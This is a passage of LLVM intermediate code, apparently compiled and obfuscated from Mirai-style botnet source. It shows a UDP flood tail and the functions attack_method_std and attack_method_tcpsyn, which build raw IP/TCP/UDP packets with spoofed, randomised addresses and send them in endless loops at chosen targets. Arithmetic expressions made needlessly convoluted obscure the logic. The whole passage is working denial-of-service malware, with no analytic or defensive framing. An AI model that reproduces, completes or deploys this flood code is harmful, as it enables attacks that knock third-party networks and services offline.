  %445 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %444, i32 0, i32 1
  store i16 %443, i16* %445, align 2
  br label %446

; <label>:446:                                    ; preds = %437, %433
  %447 = load i8, i8* %20, align 1
  %448 = icmp ne i8 %447, 0
  br i1 %448, label %453, label %449

; <label>:449:                                    ; preds = %446
  %450 = call i32 @rand_next()
  %451 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %452 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %451, i32 0, i32 9
  store i32 %450, i32* %452, align 4
  br label %459

; <label>:453:                                    ; preds = %446
  %454 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %455 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %454, i32 0, i32 9
  %456 = load i32, i32* %455, align 4
  %457 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %458 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %457, i32 0, i32 9
  store i32 %456, i32* %458, align 4
  br label %459

; <label>:459:                                    ; preds = %453, %449
  %460 = call i32 @rand_next()
  store i32 %460, i32* %37, align 4
  %461 = call i32 @rand_next()
  store i32 %461, i32* %38, align 4
  %462 = call i32 @rand_next()
  store i32 %462, i32* %39, align 4
  %463 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %464 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %463, i32 0, i32 0
  %465 = getelementptr inbounds [6 x i8], [6 x i8]* %464, i32 0, i32 0
  %466 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* %465, i8* %466, i32 4)
  %467 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %468 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %467, i32 0, i32 1
  %469 = getelementptr inbounds [6 x i8], [6 x i8]* %468, i32 0, i32 0
  %470 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* %469, i8* %470, i32 4)
  %471 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %472 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %471, i32 0, i32 0
  %473 = getelementptr inbounds [6 x i8], [6 x i8]* %472, i32 0, i32 0
  %474 = getelementptr inbounds i8, i8* %473, i64 4
  %475 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* %474, i8* %475, i32 2)
  %476 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %477 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %476, i32 0, i32 1
  %478 = getelementptr inbounds [6 x i8], [6 x i8]* %477, i32 0, i32 0
  %479 = getelementptr inbounds i8, i8* %478, i64 4
  %480 = bitcast i32* %39 to i8*
  %481 = getelementptr inbounds i8, i8* %480, i64 2
  call void @util_memcpy(i8* %479, i8* %481, i32 2)
  %482 = load i8, i8* %19, align 1
  %483 = icmp ne i8 %482, 0
  br i1 %483, label %484, label %487

; <label>:484:                                    ; preds = %459
  %485 = load i8*, i8** %36, align 8
  %486 = load i32, i32* %18, align 4
  call void @rand_str(i8* %485, i32 %486)
  br label %487

; <label>:487:                                    ; preds = %484, %459
  %488 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %489 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %488, i32 0, i32 7
  store i16 0, i16* %489, align 2
  %490 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %491 = bitcast %struct.iphdr* %490 to i16*
  %492 = call zeroext i16 @checksum_generic(i16* %491, i32 20)
  %493 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %494 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %493, i32 0, i32 7
  store i16 %492, i16* %494, align 2
  %495 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %496 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %495, i32 0, i32 7
  store i16 0, i16* %496, align 2
  %497 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %498 = bitcast %struct.iphdr* %497 to i16*
  %499 = call zeroext i16 @checksum_generic(i16* %498, i32 20)
  %500 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %501 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %500, i32 0, i32 7
  store i16 %499, i16* %501, align 2
  %502 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %503 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %502, i32 0, i32 3
  store i16 0, i16* %503, align 2
  %504 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %505 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %506 = bitcast %struct.udphdr* %505 to i8*
  %507 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %508 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %507, i32 0, i32 2
  %509 = load i16, i16* %508, align 2
  %510 = load i32, i32* %18, align 4
  %511 = sext i32 %510 to i64
  %512 = sub i64 0, 8
  %513 = sub i64 0, %511
  %514 = add i64 %512, %513
  %515 = sub i64 0, %514
  %516 = add i64 8, %511
  %517 = trunc i64 %515 to i32
  %518 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %504, i8* %506, i16 zeroext %509, i32 %517)
  %519 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %520 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %519, i32 0, i32 3
  store i16 %518, i16* %520, align 2
  %521 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %522 = load i32, i32* %9, align 4
  %523 = sext i32 %522 to i64
  %524 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %521, i64 %523
  %525 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %524, i32 0, i32 0
  %526 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %525, i32 0, i32 0
  store i16 2, i16* %526, align 4
  %527 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %528 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %527, i32 0, i32 9
  %529 = load i32, i32* %528, align 4
  %530 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %531 = load i32, i32* %9, align 4
  %532 = sext i32 %531 to i64
  %533 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %530, i64 %532
  %534 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %533, i32 0, i32 0
  %535 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %534, i32 0, i32 2
  %536 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %535, i32 0, i32 0
  store i32 %529, i32* %536, align 4
  %537 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %538 = load i32, i32* %9, align 4
  %539 = sext i32 %538 to i64
  %540 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %537, i64 %539
  %541 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %540, i32 0, i32 0
  %542 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %541, i32 0, i32 1
  store i16 0, i16* %542, align 2
  %543 = load i32, i32* %10, align 4
  %544 = load i8*, i8** %30, align 8
  %545 = load i32, i32* %18, align 4
  %546 = sext i32 %545 to i64
  %547 = sub i64 0, %546
  %548 = sub i64 66, %547
  %549 = add i64 66, %546
  %550 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %551 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %552 = load i32, i32* %9, align 4
  %553 = sext i32 %552 to i64
  %554 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %551, i64 %553
  %555 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %554, i32 0, i32 0
  %556 = bitcast %struct.sockaddr_in* %555 to %struct.sockaddr*
  store %struct.sockaddr* %556, %struct.sockaddr** %550, align 8
  %557 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %558 = load %struct.sockaddr*, %struct.sockaddr** %557, align 8
  %559 = call i64 @sendto(i32 %543, i8* %544, i64 %548, i32 16384, %struct.sockaddr* %558, i32 16)
  br label %560

; <label>:560:                                    ; preds = %487
  %561 = load i32, i32* %9, align 4
  %562 = add i32 %561, -1400912513
  %563 = add i32 %562, 1
  %564 = sub i32 %563, -1400912513
  %565 = add nsw i32 %561, 1
  store i32 %564, i32* %9, align 4
  br label %315

; <label>:566:                                    ; preds = %315
  br label %314

; <label>:567:                                    ; preds = %92, %86
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_std(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 1024)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #7
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %174, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %181

; <label>:63:                                     ; preds = %58
  %64 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

; <label>:72:                                     ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

; <label>:81:                                     ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %82) #7
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

; <label>:90:                                     ; preds = %81, %72
  %91 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %90
  ret void

; <label>:98:                                     ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 %108, %struct.sockaddr* %112, i32 16) #6
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %98
  br label %116

; <label>:116:                                    ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %155

; <label>:125:                                    ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 %131) #7
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = sub i32 0, %132
  %143 = sub i32 0, %141
  %144 = add i32 %142, %143
  %145 = sub i32 0, %144
  %146 = add i32 %132, %141
  %147 = call i32 @htonl(i32 %145) #7
  %148 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %149 = load i32, i32* %9, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %148, i64 %150
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %151, i32 0, i32 0
  %153 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %152, i32 0, i32 2
  %154 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %153, i32 0, i32 0
  store i32 %147, i32* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %125, %116
  %156 = load i32*, i32** %11, align 8
  %157 = load i32, i32* %9, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds i32, i32* %156, i64 %158
  %160 = load i32, i32* %159, align 4
  %161 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %162 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %163 = load i32, i32* %9, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i32 0, i32 0
  %167 = bitcast %struct.sockaddr_in* %166 to %struct.sockaddr*
  store %struct.sockaddr* %167, %struct.sockaddr** %161, align 8
  %168 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %169 = load %struct.sockaddr*, %struct.sockaddr** %168, align 8
  %170 = call i32 @connect(i32 %160, %struct.sockaddr* %169, i32 16)
  %171 = icmp eq i32 %170, -1
  br i1 %171, label %172, label %173

; <label>:172:                                    ; preds = %155
  br label %173

; <label>:173:                                    ; preds = %172, %155
  br label %174

; <label>:174:                                    ; preds = %173
  %175 = load i32, i32* %9, align 4
  %176 = sub i32 0, %175
  %177 = sub i32 0, 1
  %178 = add i32 %176, %177
  %179 = sub i32 0, %178
  %180 = add nsw i32 %175, 1
  store i32 %179, i32* %9, align 4
  br label %58

; <label>:181:                                    ; preds = %58
  br label %182

; <label>:182:                                    ; preds = %216, %181
  store i32 0, i32* %9, align 4
  br label %183

; <label>:183:                                    ; preds = %210, %182
  %184 = load i32, i32* %9, align 4
  %185 = load i8, i8* %5, align 1
  %186 = zext i8 %185 to i32
  %187 = icmp slt i32 %184, %186
  br i1 %187, label %188, label %216

; <label>:188:                                    ; preds = %183
  %189 = load i8**, i8*** %10, align 8
  %190 = load i32, i32* %9, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i8*, i8** %189, i64 %191
  %193 = load i8*, i8** %192, align 8
  store i8* %193, i8** %22, align 8
  %194 = load i8, i8* %15, align 1
  %195 = icmp ne i8 %194, 0
  br i1 %195, label %196, label %200

; <label>:196:                                    ; preds = %188
  %197 = load i8*, i8** %22, align 8
  %198 = load i16, i16* %14, align 2
  %199 = zext i16 %198 to i32
  call void @rand_str(i8* %197, i32 %199)
  br label %200

; <label>:200:                                    ; preds = %196, %188
  %201 = load i32*, i32** %11, align 8
  %202 = load i32, i32* %9, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds i32, i32* %201, i64 %203
  %205 = load i32, i32* %204, align 4
  %206 = load i8*, i8** %22, align 8
  %207 = load i16, i16* %14, align 2
  %208 = zext i16 %207 to i64
  %209 = call i64 @send(i32 %205, i8* %206, i64 %208, i32 16384)
  br label %210

; <label>:210:                                    ; preds = %200
  %211 = load i32, i32* %9, align 4
  %212 = add i32 %211, 785990827
  %213 = add i32 %212, 1
  %214 = sub i32 %213, 785990827
  %215 = add nsw i32 %211, 1
  store i32 %214, i32* %9, align 4
  br label %183

; <label>:216:                                    ; preds = %183
  br label %182
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpsyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %623

; <label>:99:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 %105)
  br label %623

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %9, align 4
  br label %108

; <label>:108:                                    ; preds = %448, %107
  %109 = load i32, i32* %9, align 4
  %110 = load i8, i8* %5, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %454

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 128, i64 1) #6
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %27, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.tcphdr*
  store %struct.tcphdr* %127, %struct.tcphdr** %28, align 8
  %128 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i64 1
  %130 = bitcast %struct.tcphdr* %129 to i8*
  store i8* %130, i8** %29, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = xor i8 %133, -1
  %135 = xor i8 15, -1
  %136 = xor i8 88, -1
  %137 = or i8 %134, %135
  %138 = or i8 88, %136
  %139 = xor i8 %137, -1
  %140 = and i8 %139, %138
  %141 = and i8 %133, 15
  %142 = xor i8 %140, -1
  %143 = xor i8 64, -1
  %144 = xor i8 -126, -1
  %145 = and i8 %142, -126
  %146 = and i8 %140, %144
  %147 = and i8 %143, -126
  %148 = and i8 64, %144
  %149 = or i8 %145, %146
  %150 = or i8 %147, %148
  %151 = xor i8 %149, %150
  %152 = or i8 %142, %143
  %153 = xor i8 %152, -1
  %154 = or i8 -126, %144
  %155 = and i8 %153, %154
  %156 = or i8 %151, %155
  %157 = or i8 %140, 64
  store i8 %156, i8* %132, align 4
